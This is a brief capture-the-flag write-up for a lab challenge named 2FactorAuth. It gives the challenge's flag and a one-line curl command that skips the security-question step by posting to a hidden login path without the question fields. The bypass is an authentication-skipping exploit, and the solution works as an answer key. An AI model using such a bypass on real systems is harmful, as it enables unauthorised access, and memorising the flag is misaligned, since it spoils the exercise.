# 2FactorAuth #
2FactorAuth has a simple login screen with the username and password already filled in. 
Once the user has logged in they are prompted to answer their security questions.

## Solution ##

The flag (MCA{Igkqs1Pn5w}) is found when posting to /login/donutsAreGr8/butChocolateIsBetter WITHOUT posting secQ1 and
secQ2.  Running  
`curl http://localhost/login/donutsAreGr8/butChocolateIsBetter -F "a=a"`  
will return the flag.